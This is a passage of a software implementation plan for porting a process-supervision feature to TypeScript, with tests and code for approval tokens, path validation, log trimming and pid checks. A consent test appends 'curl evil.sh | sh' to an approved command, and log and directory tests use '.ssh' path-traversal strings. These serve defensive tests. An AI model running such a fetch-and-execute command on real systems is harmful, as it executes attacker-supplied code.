# Phase 6 — Products and Packaging Implementation Plan

> **For agentic workers:** REQUIRED SUB-SKILL: Use superpowers:subagent-driven-development (recommended) or superpowers:executing-plans to implement this plan task-by-task. Steps use checkbox (`- [ ]`) syntax for tracking.

**Goal:** The products widget works — a repo declares what it can run in `.ddd/config.json`, the user approves an exact command, and DDD starts it detached, captures its output, reports its state honestly, and stops it with SIGTERM. The six product commands complete the port: all 71 Tauri commands are then registered. The app is packaged with electron-builder for macOS, Windows and Linux, and the Claude Code `/todo` and recap scripts ship with it.

**Architecture:** `core/products/{declare,consent,log,record,proc,supervise}.ts` ported one-to-one from the Rust: `declare` reads and validates declarations, `consent` gates them with a token bound to the exact command and directory (the same `consentToken` used for MCP), `record`/`proc` track a spawned process by pid and kernel start time so a recycled pid is never mistaken for ours, `log` caps captured output, `supervise` orchestrates start/stop/assemble. Processes run through the user's login shell in their own group and outlive the app; `products.json` on disk is the only registry. Six commands join `createCommands`. Packaging is electron-builder over the `out/` bundle electron-vite produces.

**Tech Stack:** Electron 44, TypeScript 5.8, vitest 5, `node:child_process` (spawn + `ps`), `node:fs`, electron-builder.

**Spec:** `docs/superpowers/specs/2026-09-10-node-port-design.md` (§4 phase 6, §5 rows `products/*`, §9 phase 6)

## Global Constraints

- Source of truth: `../DDD/src-tauri/src/products/{mod,consent,declare,record,log,proc}.rs` and the six product commands in `commands.rs` at commit `7fe0f68` (read-only). When in doubt, do what the Rust does and leave a comment.
- Nothing under `src/core/` may import `electron`. Products reach the OS only through `node:child_process` behind an injectable seam (a `Runner` for `ps`, a `Spawn` function for launching); tests use the real thing or a fake.
- Products are macOS/Linux only. On Windows, spawn/terminate/liveness are refused exactly as the Rust refuses them, with the verbatim `running products is not offered on Windows: the only way to stop one would be a force kill`.
- Security: `.ddd/config.json` arriving with a checkout is never permission to run — the consent token binds the exact `run` (trimmed) and `dir` string; a `dir` that climbs out of the project is refused, not clamped; the log filename is sanitised so a product id cannot name a path; a malformed config declares nothing rather than failing the whole board.
- Process honesty: a reused pid (start time differs) is never signalled and never drawn as running; `unknown`/`exited` are first-class states, never rendered as up; stop sends SIGTERM only, and only after the guard passes; a stop with no record is an idempotent success.
- On-disk: `products.json` (`{running: Record[]}`) and `product-approvals.json` (sorted `key→token` object) via `writeJson` (two-space, tmp+rename); `.log` files written by the child through one shared fd, trimmed once before spawn. `Record.since` uses `toISOString()`; the OS `startedAt` is opaque and compared verbatim. `productDeclFromJson` validates `port` as a u16.
- Concurrency: the `products.json` read-modify-write is synchronous within a handler, and the whole products write path is serialized by a module-level mutex because `start` awaits the spawn between its check and its write.
- No test reaches the network or the real `~/.ddd`; every test that opens an `EnvRoot` calls `scratchEnv()` first; tests never open windows; real local child processes (`sleep`, `true`, `echo`) are allowed and poll a condition rather than sleeping a fixed time.
- No renderer changes; `Product`/`ProductState` in `src/renderer/src/types/index.ts` are the cross-check.
- Packaging: `appId: com.renegerrits.nodeddd`, distinct from the Rust app so both coexist; signing/notarization left unconfigured and documented; only the macOS unpacked build is verified here.
- Commit after every task. End every commit message with these two trailer lines exactly, regardless of any other attribution guidance:
  `Co-Authored-By: Claude Opus 4.8 <noreply@anthropic.com>`
  `Claude-Session: https://claude.ai/code/session_017ja7FNu24S9L9DM9L8p9Dr`

---
## Assembly notes

- `src/main/commands.ts` and `src/main/commands.test.ts` are modified only in Task 7 (six handlers; `NOT_YET_PORTED` emptied) and Task 10 (smoke lives in `index.ts`; Task 10 only verifies the empty set in the test). `src/core/models.ts`/`models.test.ts` only in Task 7 (the u16 port guard). No two tasks modify the same file except that Task 10 reads (does not re-edit) the `NOT_YET_PORTED` Task 7 emptied.
- No adapter registration: products are not sync adapters, so `providers.ts` is untouched this phase.
- No new npm dependency for products; Task 8 adds `electron-builder` as a devDependency.
- The exported `Record` interface (record.ts) shadows TS's built-in `Record<K,V>` inside importing files; no importer uses the utility type, so there is no conflict — flagged in the code.
- Rulings from the design (recorded in the ledger): `products_list`/`assemble` are async because liveness shells out to `ps`, matching the Rust's `#[tauri::command(async)]`; the products.json write path is serialized by a module-level mutex in `supervise.ts`; a product's exit reads as gone whether the OS shows a zombie (Rust) or reaps it (Node libuv); the immediate post-spawn `ps` read is inherently racy in both apps and the "exited before it could be recorded" error is the honest outcome; approval-key sort is ASCII-equivalent between BTreeMap and JS sort; packaging uses a distinct appId and leaves signing/notarization and the Windows/Linux installers to a release pipeline.

---

### Task 1: Declared products

**Files:**
- Create: `src/core/products/declare.ts`
- Test: `src/core/products/declare.test.ts`

**Interfaces:**
- Consumes: `ProductDecl` from `../models`.
- Produces: `interface Declared { decl: ProductDecl; dir: string }`; `usable(project: string, decls: ProductDecl[]): Declared[]`; `workingDir(project: string, dir?: string | null): string | undefined`; `label(decl: ProductDecl): string`. Pure — no I/O, no `electron`.

- [ ] **Step 1: Write the failing tests**
`src/core/products/declare.test.ts`:
```ts
import { describe, expect, it } from "vitest";
import type { ProductDecl } from "../models";
import { label, usable, workingDir } from "./declare";

const decl = (id: string, run: string): ProductDecl => ({ id, name: null, run, dir: null, port: null });
const withDir = (id: string, dir: string): ProductDecl => ({ ...decl(id, "echo hi"), dir });

describe("declare", () => {
  it("a declaration needs an id and something to run", () => {
    const kept = usable("/p", [decl("", "echo hi"), decl("blank", "   "), decl("ok", "echo hi")]);
    expect(kept.length).toBe(1);
    expect(kept[0]!.decl.id).toBe("ok");
  });

  it("a duplicate id is dropped rather than shown twice", () => {
    const kept = usable("/p", [decl("run", "echo one"), decl("run", "echo two")]);
    expect(kept.length).toBe(1);
    expect(kept[0]!.decl.run).toBe("echo one");
  });

  it("dir defaults to the project root", () => {
    expect(workingDir("/p", null)).toBe("/p");
    expect(workingDir("/p", "  ")).toBe("/p");
  });

  it("a relative dir lands inside the project", () => {
    expect(workingDir("/p", "worker")).toBe("/p/worker");
    expect(workingDir("/p", "./a/b")).toBe("/p/a/b");
  });

  it("a dir that climbs out of the project is refused", () => {
    expect(workingDir("/p", "../../.ssh")).toBeUndefined();
    expect(workingDir("/p", "a/../../b")).toBeUndefined();
    expect(workingDir("/p", "/etc")).toBeUndefined();
    expect(usable("/p", [withDir("escape", "../..")])).toEqual([]);
  });

  it("a product is labelled by its id until it is named", () => {
    expect(label(decl("post-ads", "x"))).toBe("post-ads");
    expect(label({ ...decl("post-ads", "x"), name: "Post ads" })).toBe("Post ads");
    expect(label({ ...decl("post-ads", "x"), name: "  " })).toBe("post-ads");
  });
});
```
- [ ] **Step 2: Run to verify it fails**
Run: `npx vitest run src/core/products/declare.test.ts` — expected: fails to resolve `./declare` (module does not exist yet).
- [ ] **Step 3: Write the module**
`src/core/products/declare.ts`:
```ts
/**
 * Reading what a repo says it can run. Port of `products/declare.rs`.
 *
 * `.ddd/config.json` arrives with a checkout, so every field is read
 * defensively and a malformed entry is dropped rather than allowed to become a
 * button that cannot work. Nothing here executes anything; `consent` answers
 * whether a declaration may run.
 */
import { isAbsolute, join } from "node:path";
import type { ProductDecl } from "../models";

/** A declaration checked against the checkout it came from. */
export interface Declared {
  decl: ProductDecl;
  /** Where it would run. Always inside the project — see `workingDir`. */
  dir: string;
}

/** Keep the declarations that could actually run, in the order declared. */
export function usable(project: string, decls: ProductDecl[]): Declared[] {
  const seen = new Set<string>();
  const out: Declared[] = [];
  for (const d of decls) {
    if (d.id.trim() === "" || d.run.trim() === "") continue;
    // A duplicate id would make two rows fight over one supervision record.
    if (seen.has(d.id)) continue;
    seen.add(d.id);
    const dir = workingDir(project, d.dir);
    if (dir === undefined) continue;
    out.push({ decl: d, dir });
  }
  return out;
}

/**
 * Resolve `dir` against the project root, refusing anything that leaves it.
 *
 * Refuse rather than clamp: a declaration that tried to climb out is not one
 * whose intent we should guess at. Splitting only on `/` mirrors Rust's
 * `Path::components()` on unix, the platform products run on.
 */
export function workingDir(project: string, dir?: string | null): string | undefined {
  const trimmed = dir?.trim() ?? "";
  if (trimmed === "") return project;
  // An absolute path is not "relative to the repo root" by any reading.
  if (isAbsolute(trimmed)) return undefined;
  let resolved = project;
  for (const part of trimmed.split("/")) {
    if (part === "" || part === ".") continue;
    if (part === "..") return undefined;
    resolved = join(resolved, part);
  }
  return resolved;
}

/** What a product is called on screen. */
export function label(decl: ProductDecl): string {
  const name = decl.name?.trim() ?? "";
  return name !== "" ? name : decl.id;
}
```
- [ ] **Step 4: Run to verify it passes**
Run: `npx vitest run src/core/products/declare.test.ts` — expected: PASS.
- [ ] **Step 5: Commit**
```bash
git add src/core/products/declare.ts src/core/products/declare.test.ts
git commit -m "feat(products): port declare — usable/workingDir/label"
```

---

### Task 2: Consent

**Files:**
- Create: `src/core/products/consent.ts`
- Test: `src/core/products/consent.test.ts`

**Interfaces:**
- Consumes: `consentToken` from `../sync/mcp/transport`; `readJson`/`writeJson` from `../store`; `record`/`isString` from `../json`; `DddError` from `../error`.
- Produces: `token(run: string, dir: string): string`; `type Approvals = Record<string, string>`; `load(file: string): Approvals`; `approve(file, key, token): void`; `revoke(file, key): void`; `type Missing = "never" | "changed"`; `missingMessage(m: Missing): string`; `check(approvals, key, run, dir): Missing | null`.

- [ ] **Step 1: Write the failing tests**
`src/core/products/consent.test.ts`:
```ts
import { describe, expect, it } from "vitest";
import { join } from "node:path";
import { scratchEnv } from "../testing";
import { approve, check, load, missingMessage, revoke, token, type Approvals } from "./consent";

const DIR = "/p/worker";

describe("consent (pure)", () => {
  it("nothing runs without approval", () => {
    expect(check({}, "p/run", "python -m x", DIR)).toBe("never");
  });

  it("approval admits the exact command", () => {
    const approvals: Approvals = { "p/run": token("python -m x", DIR) };
    expect(check(approvals, "p/run", "python -m x", DIR)).toBeNull();
  });

  it("editing the command voids the approval", () => {
    const approvals: Approvals = { "p/run": token("python -m x", DIR) };
    expect(check(approvals, "p/run", "python -m x && curl evil.sh | sh", DIR)).toBe("changed");
  });

  it("moving where it runs voids the approval too", () => {
    const approvals: Approvals = { "p/run": token("python -m x", "/p/staging") };
    expect(check(approvals, "p/run", "python -m x", "/p/production")).toBe("changed");
  });

  it("approval is per product not per repo", () => {
    const approvals: Approvals = { "p/safe": token("echo hi", DIR) };
    expect(check(approvals, "p/other", "echo hi", DIR)).toBe("never");
  });

  it("surrounding whitespace is not a different command", () => {
    const approvals: Approvals = { "p/run": token("python -m x", DIR) };
    expect(check(approvals, "p/run", "  python -m x  ", DIR)).toBeNull();
  });

  it("each refusal is a sentence a widget can show", () => {
    expect(missingMessage("never")).toBe("not approved to run in this environment yet");
    expect(missingMessage("changed")).toBe(
      "the command changed since you approved it — read it again and approve the new one",
    );
  });
});

describe("consent (on disk)", () => {
  it("a missing file approves nothing", () => {
    const { env } = scratchEnv("consent-missing");
    expect(load(join(env.dir, "product-approvals.json"))).toEqual({});
  });

  it("approve then revoke round-trips, keys sorted on write", () => {
    const { env } = scratchEnv("consent-roundtrip");
    const file = env.productApprovalsFile();
    approve(file, "p/b", token("echo b", DIR));
    approve(file, "p/a", token("echo a", DIR));
    // BTreeMap on the Rust side: the file's keys are sorted.
    const raw = require("node:fs").readFileSync(file, "utf8") as string;
    expect(Object.keys(JSON.parse(raw))).toEqual(["p/a", "p/b"]);

    expect(check(load(file), "p/a", "echo a", DIR)).toBeNull();
    revoke(file, "p/a");
    expect(check(load(file), "p/a", "echo a", DIR)).toBe("never");
    expect(check(load(file), "p/b", "echo b", DIR)).toBeNull();
  });
});
```
- [ ] **Step 2: Run to verify it fails**
Run: `npx vitest run src/core/products/consent.test.ts` — expected: fails to resolve `./consent`.
- [ ] **Step 3: Write the module**
`src/core/products/consent.ts`:
```ts
/**
 * Approval to run what a repo says it runs. Port of `products/consent.rs`.
 *
 * `.ddd/config.json` arrives with a checkout, so reading one must never be
 * enough to run what it says. The token is `consentToken` unchanged — one
 * implementation of "approval is bound to the exact thing approved" rather than
 * two that could drift apart.
 */
import { DddError } from "../error";
import { isString, record } from "../json";
import { readJson, writeJson } from "../store";
import { consentToken } from "../sync/mcp/transport";

/**
 * What an approval is bound to: the command *and* the directory. The same
 * `python -m worker` in `staging/` and in `production/` are two different
 * programs. `dir` is the directory string exactly as passed — no
 * canonicalization.
 */
export function token(run: string, dir: string): string {
  return consentToken([run.trim(), dir]);
}

/** `<env>/product-approvals.json` — product key to the token approved for it. */
export type Approvals = Record<string, string>;

function approvalsFromJson(raw: unknown): Approvals {
  const o = record(raw, "approvals");
  const out: Approvals = {};
  for (const [k, v] of Object.entries(o)) {
    if (!isString(v)) throw DddError.json(`invalid type for field \`${k}\``);
    out[k] = v;
  }
  return out;
}

/** A missing or unreadable file means nothing is approved — the safe direction
 *  to fail in (Rust's `read_json(..).unwrap_or_default()`). */
export function load(file: string): Approvals {
  try {
    return readJson(file, approvalsFromJson, () => ({}));
  } catch {
    return {};
  }
}

/** Write with keys sorted, so the file matches the Rust's `BTreeMap` output. */
function writeSorted(file: string, approvals: Approvals): void {
  const sorted: Approvals = {};
  for (const key of Object.keys(approvals).sort()) sorted[key] = approvals[key]!;
  writeJson(file, sorted);
}

export function approve(file: string, key: string, tok: string): void {
  const approvals = load(file);
  approvals[key] = tok;
  writeSorted(file, approvals);
}

export function revoke(file: string, key: string): void {
  const approvals = load(file);
  delete approvals[key];
  writeSorted(file, approvals);
}

/** Why a product may not run yet. Both are sentences a widget shows as they
 *  stand — a refusal that cannot explain itself reads as a bug. */
export type Missing = "never" | "changed";

export function missingMessage(m: Missing): string {
  return m === "never"
    ? "not approved to run in this environment yet"
    : "the command changed since you approved it — read it again and approve the new one";
}

/** May this exact command, in this exact directory, run? `null` = yes. */
export function check(approvals: Approvals, key: string, run: string, dir: string): Missing | null {
  const recorded = approvals[key];
  if (recorded === undefined) return "never";
  return recorded === token(run, dir) ? null : "changed";
}
```
- [ ] **Step 4: Run to verify it passes**
Run: `npx vitest run src/core/products/consent.test.ts` — expected: PASS.
- [ ] **Step 5: Commit**
```bash
git add src/core/products/consent.ts src/core/products/consent.test.ts
git commit -m "feat(products): port consent — token/approve/revoke/check"
```

---

### Task 3: Record and state

**Files:**
- Create: `src/core/products/record.ts`
- Test: `src/core/products/record.test.ts`

**Interfaces:**
- Consumes: `record`/`required`/`optional`/`isString`/`isNumber` from `../json`.
- Produces: `interface ProcInfo { startedAt: string; command: string }`; `interface Record { key; projectId; productId; pid; startedAt; command; since }` (all strings except `pid: number`); `recordFromJson(raw): Record`; `type Claim = { kind: "ours" } | { kind: "gone" } | { kind: "reused"; now: string }`; `type State` matching the renderer's `ProductState`; `claim(record: Record, now?: ProcInfo | null): Claim`; `stateOf(record?: Record, now?: ProcInfo | null): State`. Pure.
- Note: the exported interface is named `Record`, which shadows TypeScript's built-in `Record<K, V>` utility type *inside files that import it*. record.ts and its consumers do not use the utility type, so there is no conflict; `consent.ts` uses `Record<string, string>` but does not import this interface.

- [ ] **Step 1: Write the failing tests**
`src/core/products/record.test.ts`:
```ts
import { describe, expect, it } from "vitest";
import { claim, recordFromJson, stateOf, type ProcInfo, type Record } from "./record";

const record = (): Record => ({
  key: "proj/post-ads",
  projectId: "proj",
  productId: "post-ads",
  pid: 4821,
  startedAt: "Wed Sep 10 09:14:03 2026",
  command: "zsh",
  since: "2026-09-10T09:14:03Z",
});

const info = (startedAt: string, command: string): ProcInfo => ({ startedAt, command });

describe("record", () => {
  it("a pid that started when we say is ours", () => {
    expect(claim(record(), info("Wed Sep 10 09:14:03 2026", "zsh"))).toEqual({ kind: "ours" });
  });

  it("a shell that execd into the command is still ours", () => {
    // One process: `zsh -l -c "python …"` becomes `python3` the moment the
    // shell execs, same pid and same start time. The command name is not gated.
    expect(claim(record(), info("Wed Sep 10 09:14:03 2026", "python3"))).toEqual({ kind: "ours" });
  });

  it("a recycled pid is refused not adopted", () => {
    expect(claim(record(), info("Tue Sep 16 11:02:55 2026", "Slack")).kind).toBe("reused");
  });

  it("nothing at the pid means it exited", () => {
    expect(claim(record(), null)).toEqual({ kind: "gone" });
    expect(claim(record(), undefined)).toEqual({ kind: "gone" });
  });

  it("a reused pid is never drawn as running", () => {
    expect(stateOf(record(), info("Tue Sep 16 11:02:55 2026", "Slack")).state).toBe("unknown");
  });

  it("no record is stopped rather than unknown", () => {
    expect(stateOf(undefined, null)).toEqual({ state: "stopped" });
  });

  it("a record with no process reads as exited", () => {
    expect(stateOf(record(), null)).toEqual({ state: "exited", since: "2026-09-10T09:14:03Z" });
  });

  it("a running record carries pid and since", () => {
    expect(stateOf(record(), info("Wed Sep 10 09:14:03 2026", "zsh"))).toEqual({
      state: "running",
      pid: 4821,
      since: "2026-09-10T09:14:03Z",
    });
  });

  it("recordFromJson defaults a missing command to empty", () => {
    const r = recordFromJson({
      key: "p/x", projectId: "p", productId: "x", pid: 7, startedAt: "S", since: "T",
    });
    expect(r.command).toBe("");
    expect(Object.keys(r)).toEqual(["key", "projectId", "productId", "pid", "startedAt", "command", "since"]);
  });
});
```
- [ ] **Step 2: Run to verify it fails**
Run: `npx vitest run src/core/products/record.test.ts` — expected: fails to resolve `./record`.
- [ ] **Step 3: Write the module**
`src/core/products/record.ts`:
```ts
/**
 * What DDD remembers about a product it started, and whether it may still
 * believe it. Port of `products/record.rs`.
 *
 * A product outlives DDD, so across a restart the only thing left is a number
 * in a file. PIDs are recycled, so the record is checked against the kernel's
 * start time for that PID: a recycled PID belongs to a process that started
 * later, so a matching start time answers the reuse question on its own. The
 * process *name* is recorded but not gated on — a login shell that `exec`s the
 * command changes its name mid-life for one unbroken process. Everything here
 * is pure over its inputs.
 */
import { isNumber, isString, optional, record, required } from "../json";

/** What the OS says about a PID right now. */
export interface ProcInfo {
  /** The kernel's start time, verbatim and unparsed. Only ever compared to
   *  another reading of the same field, so its format is not our business. */
  startedAt: string;
  /** The executable's name. Recorded for display; see `claim`. */
  command: string;
}

/** One product DDD started and has not seen stop. Field order matches the
 *  on-disk shape (`products.json`). */
export interface Record {
  /** `<projectId>/<productId>` — unique within an environment. */
  key: string;
  projectId: string;
  productId: string;
  pid: number;
  /** The OS start time read at spawn. The whole guard rests on this. */
  startedAt: string;
  /** The command name as it was at spawn. Display only. */
  command: string;
  /** Our own clock at spawn, for showing uptime. Never used to decide. */
  since: string;
}

export function recordFromJson(raw: unknown): Record {
  const o = record(raw, "record");
  return {
    key: required(o, "key", isString),
    projectId: required(o, "projectId", isString),
    productId: required(o, "productId", isString),
    pid: required(o, "pid", isNumber),
    startedAt: required(o, "startedAt", isString),
    command: optional(o, "command", isString, ""),
    since: required(o, "since", isString),
  };
}

/** Whether a record still describes the process it was written for. */
export type Claim =
  | { kind: "ours" }
  | { kind: "gone" }
  | { kind: "reused"; now: string };

/** Does this record still hold? The start time is the entire test; the command
 *  name deliberately is not. */
export function claim(rec: Record, now?: ProcInfo | null): Claim {
  if (now === undefined || now === null) return { kind: "gone" };
  if (now.startedAt !== rec.startedAt) {
    return { kind: "reused", now: `${now.command} (pid ${rec.pid})` };
  }
  return { kind: "ours" };
}

/** How a product is doing. Mirrors the renderer's `ProductState`. `unknown` is
 *  a first-class answer, not an error: the app never claims health it has not
 *  verified. */
export type State =
  | { state: "running"; pid: number; since: string }
  | { state: "stopped" }
  | { state: "exited"; since: string }
  | { state: "unknown"; why: string };

/** Turn a record and a live reading into the state a widget draws. */
export function stateOf(rec?: Record, now?: ProcInfo | null): State {
  if (rec === undefined) return { state: "stopped" };
  const c = claim(rec, now);
  if (c.kind === "ours") return { state: "running", pid: rec.pid, since: rec.since };
  if (c.kind === "gone") return { state: "exited", since: rec.since };
  return { state: "unknown", why: `pid ${rec.pid} belongs to ${c.now} now, not to this product` };
}
```
- [ ] **Step 4: Run to verify it passes**
Run: `npx vitest run src/core/products/record.test.ts` — expected: PASS.
- [ ] **Step 5: Commit**
```bash
git add src/core/products/record.ts src/core/products/record.test.ts
git commit -m "feat(products): port record — claim/stateOf and the on-disk Record"
```

---

### Task 4: Captured log

**Files:**
- Create: `src/core/products/log.ts`
- Test: `src/core/products/log.test.ts`

**Interfaces:**
- Consumes: `lines` from `../dev/run` (matches Rust's `str::lines()`).
- Produces: `const CAP_BYTES = 256 * 1024`; `file(dir: string, key: string): string`; `trim(path: string): void`; `tail(path: string, lines: number): string`.

- [ ] **Step 1: Write the failing tests**
`src/core/products/log.test.ts`:
```ts
import { describe, expect, it } from "vitest";
import { mkdtempSync, readFileSync, statSync, writeFileSync } from "node:fs";
import { tmpdir } from "node:os";
import { basename, dirname, join } from "node:path";
import { CAP_BYTES, file, tail, trim } from "./log";

const temp = () => mkdtempSync(join(tmpdir(), "ddd-log-"));

describe("log", () => {
  it("a product id can never name a path", () => {
    const f = file("/logs", "../../.ssh/authorized_keys");
    expect(dirname(f)).toBe("/logs");
    expect(f.includes("..")).toBe(false);
  });

  it("an ordinary key stays readable", () => {
    expect(file("/logs", "proj-post_ads")).toBe("/logs/proj-post_ads.log");
  });

  it("a small log is left alone", () => {
    const path = join(temp(), "small.log");
    writeFileSync(path, "one\ntwo\n");
    trim(path);
    expect(readFileSync(path, "utf8")).toBe("one\ntwo\n");
  });

  it("a month of output is cut back to the recent end", () => {
    const path = join(temp(), "big.log");
    const line = "a service saying something\n";
    writeFileSync(path, line.repeat(Math.floor(CAP_BYTES / line.length) + 5000));
    expect(statSync(path).size).toBeGreaterThan(CAP_BYTES);

    trim(path);

    const after = readFileSync(path, "utf8");
    expect(Buffer.byteLength(after)).toBeLessThanOrEqual(CAP_BYTES);
    // The tail survived and starts on a line boundary, not mid-word.
    expect(after.endsWith(line)).toBe(true);
    expect(after.startsWith("a service")).toBe(true);
  });

  it("tail reads the end and survives a missing file", () => {
    const path = join(temp(), "tail.log");
    writeFileSync(path, "one\ntwo\nthree\nfour\n");
    expect(tail(path, 2)).toBe("three\nfour");
    expect(tail(join(temp(), "nope.log"), 5)).toBe("");
  });

  it("a non-word key basename stays put", () => {
    // Sanity: sanitisation keeps the file in the given directory.
    const f = file("/logs", "proj/svc");
    expect(dirname(f)).toBe("/logs");
    expect(basename(f)).toBe("proj-svc.log");
  });
});
```
- [ ] **Step 2: Run to verify it fails**
Run: `npx vitest run src/core/products/log.test.ts` — expected: fails to resolve `./log`.
- [ ] **Step 3: Write the module**
`src/core/products/log.ts`:
```ts
/**
 * Captured output, kept small enough to leave running for a month. Port of
 * `products/log.rs`.
 *
 * A service left up writes a log line every second forever, so the cap is not a
 * nicety. The trim is from the front: the interesting end of a log you glance
 * at is the recent end. It seeks the last `CAP_BYTES` bytes and drops the
 * partial first line — byte work, not string work, so a multi-byte character
 * split at the boundary cannot corrupt the count.
 */
import { closeSync, openSync, readSync, statSync, writeFileSync } from "node:fs";
import { join } from "node:path";
import { lines } from "../dev/run";

/** How much output one product keeps. */
export const CAP_BYTES = 256 * 1024;

/** Where one product's output goes. Keyed by a sanitised product key so an id
 *  out of a repo's config cannot name a path. */
export function file(dir: string, key: string): string {
  const safe = key.replace(/[^A-Za-z0-9_-]/g, "-");
  return join(dir, `${safe}.log`);
}

/**
 * Trim a log back under the cap, keeping the tail. Called before a start, the
 * only moment we are the file's only writer: once the child holds the
 * descriptor, reaching in behind it would be a race we would lose.
 */
export function trim(path: string): void {
  let size: number;
  try {
    size = statSync(path).size;
  } catch {
    return;
  }
  if (size <= CAP_BYTES) return;

  const fd = openSync(path, "r");
  const kept = Buffer.alloc(CAP_BYTES);
  try {
    readSync(fd, kept, 0, CAP_BYTES, size - CAP_BYTES);
  } finally {
    closeSync(fd);
  }
  // Drop the partial first line rather than open on half a word.
  const nl = kept.indexOf(0x0a);
  const from = nl === -1 ? 0 : nl + 1;
  writeFileSync(path, kept.subarray(from));
}

/** The last `count` lines, for the widget. Reads the whole (capped) file. */
export function tail(path: string, count: number): string {
  let text: string;
  try {
    text = require("node:fs").readFileSync(path, "utf8") as string;
  } catch {
    return "";
  }
  const all = lines(text);
  return all.slice(Math.max(0, all.length - count)).join("\n");
}
```
- [ ] **Step 4: Run to verify it passes**
Run: `npx vitest run src/core/products/log.test.ts` — expected: PASS.
- [ ] **Step 5: Commit**
```bash
git add src/core/products/log.ts src/core/products/log.test.ts
git commit -m "feat(products): port log — file/trim/tail with the byte cap"
```

---

### Task 5: Process reading and signalling

**Files:**
- Create: `src/core/products/proc.ts`
- Test: `src/core/products/proc.test.ts`

**Interfaces:**
- Consumes: `ProcInfo` from `./record`; `Runner`, `execFileRunner`, `lines` from `../dev/run`; `DddError` from `../error`.
- Produces: `const PID_CEILING = 4_194_304`; `infos(pids: number[], runner?: Runner): Promise<Map<number, ProcInfo>>`; `info(pid: number, runner?: Runner): Promise<ProcInfo | null>`; `terminate(pid: number): void`. `infos`/`info` are async (they shell out to `ps`); `terminate` sends `SIGTERM` synchronously and throws on failure.

- [ ] **Step 1: Write the failing tests**
`src/core/products/proc.test.ts`:
```ts
import { describe, expect, it } from "vitest";
import { spawn } from "node:child_process";
import { info, infos } from "./proc";

/** High enough to be free, low enough that `ps` will consider the question. */
const DEAD = 99_998;
/** Above PID_CEILING, so it is dropped before `ps` is asked. */
const IMPOSSIBLE = 4_294_967_294;

async function waitUntil(cond: () => Promise<boolean>): Promise<boolean> {
  for (let i = 0; i < 200; i++) {
    if (await cond()) return true;
    await new Promise((r) => setTimeout(r, 10));
  }
  return false;
}

describe("proc", () => {
  it("our own process reads back", async () => {
    const got = await info(process.pid);
    expect(got).not.toBeNull();
    expect(got!.startedAt).not.toBe("");
    expect(got!.command).not.toBe("");
    expect(got!.command.includes("/")).toBe(false);
  });

  it("reading the same pid twice agrees", async () => {
    expect(await info(process.pid)).toEqual(await info(process.pid));
  });

  it("a pid that is not running is absent", async () => {
    expect(await info(DEAD)).toBeNull();
  });

  it("a pid that could not exist is absent without asking", async () => {
    expect(await info(IMPOSSIBLE)).toBeNull();
    expect(await info(0)).toBeNull();
  });

  it("one impossible pid does not hide the others", async () => {
    const got = await infos([process.pid, IMPOSSIBLE, 1]);
    expect(got.has(process.pid)).toBe(true);
    expect(got.has(1)).toBe(true);
  });

  it("asking about nothing asks the os nothing", async () => {
    expect((await infos([])).size).toBe(0);
  });

  it("a batch answers for every live pid at once", async () => {
    const got = await infos([process.pid, DEAD, 1]);
    expect(got.has(process.pid)).toBe(true);
    expect(got.has(DEAD)).toBe(false);
    expect(got.has(1)).toBe(true); // pid 1 always exists
  });

  it("an exited child is not reported as running", async () => {
    // Spawn something that exits at once and never wait on it, exactly as a
    // product is spawned. Poll until it reads as absent.
    const child = spawn("true", [], { stdio: "ignore", detached: true });
    child.unref();
    const pid = child.pid!;
    expect(await waitUntil(async () => (await info(pid)) === null)).toBe(true);
  });
});
```
- [ ] **Step 2: Run to verify it fails**
Run: `npx vitest run src/core/products/proc.test.ts` — expected: fails to resolve `./proc`.
- [ ] **Step 3: Write the module**
`src/core/products/proc.ts`:
```ts
/**
 * Reading and signalling a process by PID. Port of `products/proc.rs`.
 *
 * The only platform-specific corner of this feature. Everything that decides
 * anything lives in `record.ts` and is pure; this file answers "what holds
 * these PIDs right now" and "please stop". `ps` is reached through the injected
 * `Runner` so a test could feed fixture output, though the tests here use the
 * real thing against real processes, as the Rust does.
 */
import { DddError } from "../error";
import { execFileRunner, lines, type Runner } from "../dev/run";
import type { ProcInfo } from "./record";

/** Above every configured `pid_max` on any platform we run on — Linux's
 *  default ceiling is 4194304 and macOS wraps at 99999. */
export const PID_CEILING = 4_194_304;

const WIN_MESSAGE =
  "running products is not offered on Windows: the only way to stop one would be a force kill";

async function run(runner: Runner, args: string[]): Promise<string[]> {
  // `ps` exits non-zero when *no* PID matched, which is a normal empty answer
  // here rather than a failure. `execFileRunner` returns stdout regardless of
  // status, matching the Rust's `Command::output()`.
  const { stdout } = await runner("ps", args);
  return lines(stdout)
    .map((l) => l.trim())
    .filter((l) => l !== "");
}

/**
 * What the OS says about a set of PIDs. Absent from the map means nothing
 * *usable* holds that PID. Batched because this runs on every refresh.
 */
export async function infos(pids: number[], runner: Runner = execFileRunner): Promise<Map<number, ProcInfo>> {
  if (process.platform === "win32") return new Map();

  // A PID that could not exist is dropped before asking: `ps` refuses the
  // *whole* batch when one argument is out of range, which would make one
  // corrupt record in products.json take the board with it.
  const asked = pids.filter((p) => p > 0 && p <= PID_CEILING);
  if (asked.length === 0) return new Map();
  const list = asked.join(",");
  const out = new Map<number, ProcInfo>();

  // `lstart` last, because it is the only field that contains spaces — so
  // everything before it splits cleanly and the remainder is the date.
  for (const line of await run(runner, ["-o", "pid=,stat=,lstart=", "-p", list])) {
    const parts = line.split(/\s+/);
    if (parts.length < 2) continue;
    const pidText = parts[0]!;
    const stat = parts[1]!;
    if (!/^\d+$/.test(pidText)) continue;
    const pid = Number(pidText);
    // A zombie has exited and not yet been reaped; it still answers `ps` with
    // its original start time. DDD never waits on a product, so skipping
    // zombies is how a product's exit becomes visible while DDD is up.
    if (stat.startsWith("Z")) continue;
    const startedAt = parts.slice(2).join(" ");
    if (startedAt === "") continue;
    out.set(pid, { startedAt, command: "" });
  }

  // Names are for display only, so a failure here costs a label, not a guard.
  for (const line of await run(runner, ["-o", "pid=,comm=", "-p", list])) {
    const parts = line.split(/\s+/);
    const pidText = parts[0];
    if (pidText === undefined || !/^\d+$/.test(pidText)) continue;
    const pid = Number(pidText);
    const comm = parts.slice(1).join(" ");
    const found = out.get(pid);
    if (found !== undefined) {
      // `comm` is a path on Linux and a basename on macOS. Show the last part.
      found.command = comm.slice(comm.lastIndexOf("/") + 1);
    }
  }
  return out;
}

export async function info(pid: number, runner: Runner = execFileRunner): Promise<ProcInfo | null> {
  return (await infos([pid], runner)).get(pid) ?? null;
}

/**
 * Ask a process to stop. `SIGTERM` only, and never after a failed guard — the
 * caller has just verified this PID against a fresh reading via `claim`. Throws
 * on failure; `supervise.stop` maps that to the caller. Windows has no
 * `SIGTERM` and `TerminateProcess` is a force kill, so products are not
